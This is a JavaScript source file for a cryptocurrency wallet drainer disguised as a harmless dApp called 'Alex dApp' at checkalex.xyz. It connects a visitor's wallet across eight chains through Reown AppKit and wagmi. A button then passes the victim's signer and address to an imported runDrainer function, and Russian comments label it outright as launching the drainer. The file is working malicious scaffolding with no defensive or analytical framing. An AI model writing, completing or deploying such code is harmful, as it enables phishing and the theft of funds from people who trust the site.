// main.js
import { createAppKit } from '@reown/appkit';
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { ethers } from 'ethers';
import { runDrainer } from './drainer.js';

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';

const networks = [
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
];

const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks,
});

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect your wallet',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  projectId,
  features: {
    analytics: true,
  },
});

let appProvider = null;
let appSigner = null;
let userAddress = null;

// Подключение кошелька
modal.on('connect', async ({ provider }) => {
  try {
    if (!provider) {
      alert("Не удалось получить provider. Попробуйте использовать другой браузер или откройте сайт в мобильном кошельке.");
      return;
    }

    appProvider = new ethers.providers.Web3Provider(provider, 'any');
    appSigner = appProvider.getSigner();
    userAddress = await appSigner.getAddress();

    const statusEl = document.getElementById('status');
    if (statusEl) {
      statusEl.textContent = `Подключено: ${userAddress}`;
    }

  } catch (e) {
    console.error('Ошибка при подключении:', e);
    alert('Ошибка при подключении кошелька: ' + e.message);
  }
});

// Открытие модального окна подключения
const connectBtn = document.getElementById('open-connect-modal');
if (connectBtn) {
  connectBtn.addEventListener('click', () => modal.open());
}

// Запуск дрейнера
const drainBtn = document.getElementById('drainer-btn');
if (drainBtn) {
  drainBtn.addEventListener('click', async () => {
    if (!appSigner || !appProvider || !userAddress) {
      return alert('Сначала подключите кошелёк!');
    }

    try {
      await runDrainer(appProvider, appSigner, userAddress);
    } catch (e) {
      console.error('Ошибка в Drainer:', e);
      alert('Ошибка при выполнении Drainer: ' + e.message);
    }
  });
}
